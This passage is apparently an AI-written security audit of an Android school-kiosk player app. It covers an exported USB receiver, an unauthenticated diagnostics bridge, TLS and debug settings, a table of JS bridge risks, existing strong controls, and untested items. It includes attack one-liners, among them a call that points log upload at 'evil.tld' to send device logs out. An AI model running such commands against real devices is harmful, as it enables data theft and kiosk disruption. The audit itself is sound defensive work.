**Confidence:** High for the code; Medium for the practical payoff (I did not enumerate every reachable non-exported component's behaviour).

**Verification methods:** (1) full read of the trampoline plus both call sites (`onCreate:256`, `onNewIntent:579`); (2) read of the manifest confirming `exported="true"` with no permission attribute, and of `file_paths.xml` to bound the FileProvider exposure.

---

### [MEDIUM] AND-007 — Exported `UsbAttachReceiver` performs no action check and launches a system file browser over the kiosk

**Attacker:** a co-installed app (broadcast) **or** a student with a USB stick (physical).

**File:line:** `usb/UsbAttachReceiver.kt:17-30`, `AndroidManifest.xml:289-299`, `usb/UsbIngestActivity.kt:19-57`.

**Evidence:**

```kotlin
// UsbAttachReceiver.kt:18-28 — no `if (intent.action != …) return` guard
override fun onReceive(context: Context, intent: Intent) {
    Log.i("UsbAttachReceiver", "USB device attached: ${intent.action}")
    val launch = Intent(context, UsbIngestActivity::class.java).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP) }
    runCatching { context.startActivity(launch) } ...
}
```
Compare `BootReceiver.kt:24-25`, which *does* guard (`if (action !in BOOT_ACTIONS) return`) — the omission here is inconsistent, not deliberate.
```kotlin
// UsbIngestActivity.kt:26-27 (own comment) and :51-57
// V1 scaffold: no PIN prompt yet — the tenant feature flag + signed manifest are the security gate.
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    Toast.makeText(this, "USB detected — select the stick's root folder", Toast.LENGTH_LONG).show()
    pickTree.launch(null)     // ← opens the system SAF document picker, full-screen
}
```

**Attack (physical, the more interesting one):**
1. Student plugs a USB stick into the screen's exposed port.
2. `UsbIngestActivity` immediately launches `ACTION_OPEN_DOCUMENT_TREE` — the OS **DocumentsUI file browser** appears full-screen over the kiosk content, before any pairing/tenant check runs (those happen later, in `runIngest`, at `:59-84`).
3. DocumentsUI is a general-purpose browser over device and app storage with its own overflow menus; it is a materially larger attack surface than the player, and it is reachable with no PIN.

**Attack (co-installed app):** `context.sendBroadcast(Intent().setComponent(ComponentName("com.educms.player.debug","com.educms.player.usb.UsbAttachReceiver")))` → same file picker, no USB device needed; repeatable as a display-denial attack.

**Impact:** Kiosk-escape surface and a display-availability attack on a life-safety screen. Bounded by the fact that the *ingest* itself is properly gated (HMAC key + tenant id required, `UsbIngestActivity.kt:71-82`) — the exposure is the picker UI, not the content pipeline.

**Fix:** Add the missing action guard in `UsbAttachReceiver` (mirror `BootReceiver`'s `BOOT_ACTIONS` pattern), and gate `UsbIngestActivity.onCreate` behind an operator PIN **before** launching the SAF picker — the file's own TODO already calls for this.

**Confidence:** High for the missing action check and the unconditional picker launch. Medium for how far DocumentsUI lets a student roam — that is ROM-dependent and I did not test it.

**Verification methods:** (1) full read of both files; (2) manifest read confirming `exported="true"` with a filter, and `UsbIngestActivity` `exported="false"` (so the receiver is the only external route to it).

---

### [MEDIUM] AND-008 — Diagnostics bridge is unauthenticated: any frame can read the device log and trigger an upload to an attacker-chosen host

**Attacker:** any JS in the player WebView (AND-002).

**File:line:** `WebAppBridge.kt:121-141`, `MainActivity.kt:912-930`, `logging/PlayerLogger.kt:93-106`.

**Evidence:**
```kotlin
// WebAppBridge.kt:121-127 / 135-141 — no auth, no origin check
@JavascriptInterface fun getRecentLogs(): String = try { getRecentLogsImpl() } catch ...
@JavascriptInterface fun uploadDiagnostics(): String = try { uploadDiagnosticsImpl() } catch ...
```
```kotlin
// MainActivity.kt:916-929 — upload target is the JS-writable api_root
val apiRoot = prefs.getString("api_root", null)
val jwt = prefs.getString("device_jwt", null)
val fp = prefs.getString("device_fingerprint", null)
...
PlayerLogger.uploadRecent(apiRoot, jwt, fp)
```

**Attack:** `EduCmsNative.setBootstrap("https://evil.tld","x"); EduCmsNative.uploadDiagnostics();` → the rotating on-device log (device fingerprint, API root, `DeviceBeacon` hardware/network/WebView inventory, crash stack traces, OTA history) is POSTed to the attacker. Or simply `EduCmsNative.getRecentLogs()` and exfiltrate via `fetch()`.

**Impact:** Reconnaissance-grade information disclosure — enough to fingerprint the fleet's hardware, WebView versions, and network topology for follow-on attacks.

**Not as bad as it looks, in one respect:** `device_jwt` is **never written** anywhere in the module — grep for `device_jwt` across `apps/player` (excluding `build/`) returns exactly one hit, the read at `MainActivity.kt:919`. `setBootstrap` writes only `api_root` and `device_fingerprint`. So the upload carries a `null` bearer token, not the device credential. Log storage is `getExternalFilesDir("logs")` (`PlayerLogger.kt:57`) — app-scoped external storage, readable by other apps on older API levels.

**Fix:** Gate `getRecentLogs`/`uploadDiagnostics` behind the same origin restriction as the rest of the bridge (AND-002 fix), pin the upload host, and scrub the `DeviceBeacon` block from the on-disk log (keep it in logcat only).

**Confidence:** High. **Verification methods:** (1) full read of `WebAppBridge.kt`, the lambda bodies in `MainActivity.kt`, and `PlayerLogger.kt`; (2) grep for `device_jwt` writers across the module (none found).

---

### [LOW] AND-009 — TLS and debug posture

**File:line:** `res/xml/network_security_config.xml:1-15`, `AndroidManifest.xml:97`, merged debug manifest line 119, `MainActivity.kt:1282`.

- **User-installed CAs are correctly excluded.** `base-config` declares `<certificates src="system" />` only, and there is no `<debug-overrides>` block. A student or a district MDM installing a root CA does **not** get to MITM the player — this is the single best control in the file, and it substantially blunts the school-WiFi MITM threat model.
- `usesCleartextTraffic="false"` plus `cleartextTrafficPermitted="false"` in `base-config`; cleartext is re-permitted only for `10.0.2.2`, `localhost`, `127.0.0.1` (emulator dev). Acceptable.
- **No certificate pinning.** With system-only trust anchors this is defence-in-depth rather than a gap, but a compromised public CA remains in scope for a life-safety channel.
- **No `onReceivedSslError` override** anywhere in the module (grep: zero hits), so the default — cancel the load on any TLS error — applies. Correct, and worth stating explicitly since `proceed()` is the classic sin here.
- The **overlay** WebView weakens mixed content to `MIXED_CONTENT_COMPATIBILITY_MODE` (`MainActivity.kt:1282`) versus the main WebView's `MIXED_CONTENT_NEVER_ALLOW` (`:897`). Largely moot because cleartext is blocked app-wide, but it is an unnecessary asymmetry.
- **`android:debuggable="true"` in the shipped build** (confirmed independently at `app/build/intermediates/merged_manifest/debug/processDebugMainManifest/AndroidManifest.xml:119`). `setWebContentsDebuggingEnabled` is never called in our code — but AOSP's WebView provider auto-enables remote debugging for debuggable apps, so `chrome://inspect` over ADB is expected to grant full JS execution in the bridged WebView, i.e. the entire bridge. I mark the auto-enable as **UNVERIFIED** (documented AOSP behaviour, not device-tested here). Anyone reaching ADB already has `run-as`, so this changes little — but it is a much lower-effort path to AND-001/003 than `run-as`.

**Fix:** Ship `assembleRelease` with a rotated, non-committed key; if a debug build must ship, explicitly call `WebView.setWebContentsDebuggingEnabled(false)`. Consider pinning the API and player hosts.

---

## Full JS bridge capability inventory

All 18 `@JavascriptInterface` methods on `window.EduCmsNative` (`WebAppBridge.kt`). "Hostile JS" = any script in any frame of the main player WebView (see AND-002).

| # | Method (`WebAppBridge.kt:line`) | What it does | Risk if hostile JS calls it |
|---|---|---|---|
| 1 | `exitToDeviceHome()` :68 | Disables `KioskHomeAlias`, clears preferred activities, explicitly launches the OEM launcher, `finishAffinity()` (`MainActivity.kt:931-1067`) | **HIGH** — kills the kiosk, drops the screen off the emergency display path until someone physically relaunches; exposes the OEM CMS/network settings |
| 2 | `unpair()` :70 | Clears the native DataStore token, reloads to pairing (`MainActivity.kt:1479-1494`) | **HIGH** — de-provisions the screen; no future lockdown/evacuation alert reaches it |
| 3 | `reload()` :73 | `webView.reload()` | LOW — DoS by reload loop |
| 4 | `heartbeat()` :84 | Resets the 10-min stuck-page watchdog (`MainActivity.kt:1189-1199`) | **MEDIUM** — call it forever to **disable the watchdog**, keeping a frozen/hijacked page on screen indefinitely |
| 5 | `setOrientation(String)` :94 | `setRequestedOrientation` + persists to prefs | LOW-MEDIUM — rotate every screen in a building 90°; persists across reboot |
| 6 | `deviceInfo()` :98 | Returns manufacturer/model/SDK/resolution/appVersion JSON | LOW — fingerprinting |
| 7 | `checkForUpdates()` :108 | Fires `OtaUpdateWorker` **immediately**; returns `versionName` | **CRITICAL** — the trigger half of AND-001; turns a 6-hour wait into an instant install |
| 8 | `getRecentLogs()` :122 | Returns up to 500 lines of the on-device log | **MEDIUM** — api root, fingerprint, hardware/network/WebView inventory, crash traces (AND-008) |
| 9 | `uploadDiagnostics()` :136 | POSTs the log file to `api_root` | **MEDIUM** — exfiltrates the log to a JS-chosen host (AND-008) |
| 10 | `setBootstrap(apiRoot, fp)` :167 | **Writes the native `api_root` + `device_fingerprint` prefs** — no scheme, host, or auth check | **CRITICAL** — repoints OTA update-check, APK download, heartbeat, OTA-state and log upload at an attacker host (AND-001) |
| 11 | `showUrlOverlay(url)` :181 | Loads any `http(s)` URL full-screen in the (bridge-free) overlay WebView | **HIGH** — arbitrary full-screen content on a hallway display; fake emergency instructions (AND-005) |
| 12 | `hideUrlOverlay()` :197 | Hides the overlay | LOW |
| 13 | `openSettingsForManager()` :221 | Launches system Settings (`MANAGE_UNKNOWN_APP_SOURCES`, or `APPLICATION_DETAILS_SETTINGS` fallback) for the Manager package | **MEDIUM** — pops a system Settings screen over the kiosk on demand: display DoS, and a social-engineering surface aimed at getting install permission granted |
| 14 | `ctsSerialEnabled()` :249 | Always `true` (`SerialPortBridge.kt:112`) | LOW |
| 15 | `ctsSerialConnect(path,…)` :261 | `stty` via `sh -c` with the path interpolated, then opens the tty | **CRITICAL** — shell command injection as the app UID (AND-003); also arbitrary file-read attempt on any `/dev/tty*` |
| 16 | `ctsSerialDisconnect()` :281 | Closes the port | LOW — disrupts a live scoreboard feed |
| 17 | `ctsSerialStatus()` :296 | Returns port state JSON | LOW |
| 18 | *(inbound)* `window.__ctsSerialBytes(b64)` | Native→JS push of serial bytes (`SerialPortBridge.kt:277-289`) | LOW — base64 only, no quote/backslash chars, so the string-concatenated `evaluateJavascript` at `:285-288` is not injectable |

**Origin checks inside bridge methods: zero.** `removeJavascriptInterface`: never called. Verified by full read of all 304 lines of `WebAppBridge.kt` plus a module-wide grep.

---

## What's already strong

Real controls, worth preserving through any remediation:

1. **The URL allowlist is written correctly.** `SafePlayerWebViewClient.kt:106-112` uses `host == allowedHost || host.endsWith(".$allowedHost")` — the leading dot means `venue-os.app.attacker.net` and `evil-venue-os.app` are both rejected. This is the exact bug class the audit brief asked about, and it is *not* present.
2. **The overlay WebView is deliberately bridge-free.** `configureUrlOverlay` (`MainActivity.kt:1261-1331`) contains no `addJavascriptInterface`; third-party browsing (e-arc.com etc.) is architecturally separated from the bridge. The intent is right — the gap is that iframes inside the *main* WebView bypass the separation.
3. **File and content access are off on both WebViews.** `allowFileAccess = false` / `allowContentAccess = false` at `MainActivity.kt:891-892` and `:1276-1277`. `setAllowUniversalAccessFromFileURLs` and `setAllowFileAccessFromFileURLs` are **never called** anywhere in the module (grep + full read) — so they sit at their safe API-16+ defaults. The "AllowUniversalAccessFromFileURLs + a bridge = total compromise" scenario does not apply here.
4. **Mixed content blocked on the bridged WebView.** `MIXED_CONTENT_NEVER_ALLOW`, `MainActivity.kt:897`.
5. **Media/geolocation/camera permission requests are denied outright** on both WebViews — `onPermissionRequest(request) { request.deny() }` at `MainActivity.kt:1230-1232` and `:1299-1301`.
6. **No `onReceivedSslError` override** → TLS errors cancel the load (default). No `proceed()` anywhere.
7. **System-only trust anchors**, no `<debug-overrides>` — user-installed CAs cannot MITM the player (`network_security_config.xml:4-8`).
8. **No `setDownloadListener`, no `onShowFileChooser`** anywhere in the module (grep, zero hits) — so downloads and `<input type=file>` cannot be used to reach the filesystem or a file browser from within a page.
9. **`shouldOverrideUrlLoading` returning `false` on the overlay** incidentally blocks `intent://`, `market://` and other scheme-based app-launch escapes — WebView handles the URL itself rather than handing it to the system.
10. **FileProvider exposure is minimal** — one directory, `getExternalFilesDir(null)/updates` (`file_paths.xml:10-12`), `exported="false"`.
11. **`BootReceiver` validates its action** (`BootReceiver.kt:24-25`) against a fixed allowlist before doing anything — the correct pattern, and the model `UsbAttachReceiver` should follow.
12. **Emergency remote-input lockout.** `apps/web/src/app/player/page.tsx:2896-2901, 2927-2935` — while an emergency is displayed, Back/Escape/Home/`i` are inert and cannot surface the Stop splash or reach Exit/Unpair. Server-side all-clear is the only exit. Well-designed.
13. **USB ingest content is properly gated** — requires a paired token, a tenant id, and an HMAC key issued only to opted-in tenants (`UsbIngestActivity.kt:61-84`). The weakness is the picker UI in front of it, not the pipeline.
14. **The `__ctsSerialBytes` native→JS push is injection-safe** by construction (base64 alphabet contains no quotes or backslashes) — `SerialPortBridge.kt:277-289`.
15. **`setAppPackageName(ctx.packageName)`** on the install session (`OtaUpdateWorker.kt:421`) with an explicit comment about guarding against APK swapping — right instinct; it just cannot survive a public signing key.

---

## Not checked / UNVERIFIED

Stated plainly so nothing here reads as a clean bill of health:

1. **Device-level confirmation that `addJavascriptInterface` objects reach cross-origin and sandboxed iframes.** This is documented Android behaviour and the stated reason `WebViewCompat.addWebMessageListener(..., allowedOriginRules, ...)` exists, but this audit was read-only — no emulator, no `chrome://inspect`, no APK build. **This is the single highest-value thing to test on hardware**, because AND-001/002/003/005 pivot on it. Test: load `/player` in the APK, mount a WEBPAGE widget pointed at a page that does `document.title = typeof window.EduCmsNative`, and read the result from logcat's `PlayerWeb` console tag.
2. **Whether `shouldOverrideUrlLoading` fires for subframe navigations in the WebView versions actually deployed** (Chromium 83–87 on Taurus through modern on Goodview). If it does, the host allowlist would block the proxy iframe (`API_BASE` is the Railway host in the documented Vercel config, not `venue-os.app`) — which would mean WEBPAGE widgets are *broken* on those APKs rather than dangerous. If `NEXT_PUBLIC_API_URL` is ever left unset so `API_BASE` resolves same-origin via the `vercel.json` rewrite (`apps/web/vercel.json:3-8`), the allowlist passes trivially and the proxied third-party page is **same-origin with the player**, which is materially worse. **The deployed value of `NEXT_PUBLIC_API_URL` should be confirmed** — I could not read Vercel env from here.
3. **Whether WebView remote debugging is auto-enabled on this debuggable build.** Believed yes (AOSP `WebViewChromiumFactoryProvider` enables it for `FLAG_DEBUGGABLE` apps); not device-verified.
4. **Text-selection ActionMode escape.** No `setOnLongClickListener`/`setLongClickable(false)` exists in the module (grep, zero hits), so the WebView's default long-press selection menu — which on many ROMs offers "Web search", firing `ACTION_WEB_SEARCH` to an external browser — is not suppressed. Whether those menu items are present depends on the OEM ROM; **untested**, flagged as a plausible additional kiosk-escape vector.
5. **The `com.educms.manager` companion APK** (device owner on provisioned kiosks, holds `DevicePolicyManager` powers, exposes `PlayerHealthProvider`) was **out of scope** for this pass. It is the higher-privilege half of the pair and warrants its own audit — particularly `ManagerSelfUpdateWorker` and `OtaWorker`, which appear to have their own `api_root`-style configuration.
6. **The server-side `/api/v1/proxy/web` endpoint** — SSRF controls, auth, and whether it can be pointed at internal hosts — was only skimmed (`apps/api/src/proxy/proxy.controller.ts:9-27, 599-613`). Its header-stripping behaviour is confirmed; its input validation is not.
7. **Exhaustive XSS review of the player's main frame.** I confirmed `RICH_TEXT` sanitizes via DOMPurify (`apps/web/src/components/widgets/v2/RichTextWidgets.tsx:9,21`), but there are ~20 other widget files using `dangerouslySetInnerHTML` that I did not individually verify. Any one of them reachable from manifest data is a direct route to the bridge in the **main** frame, which would make AND-001/003 exploitable regardless of how item 1 resolves.
8. **No dynamic testing of any kind** — no ADB, no emulator, no traffic capture. Every finding is source-derived.agentId: a8ca8ed8260f4f82b (use SendMessage with to: 'a8ca8ed8260f4f82b', summary: '<5-10 word recap>' to continue this agent)
<usage>subagent_tokens: 271807
tool_uses: 55
duration_ms: 854782</usage>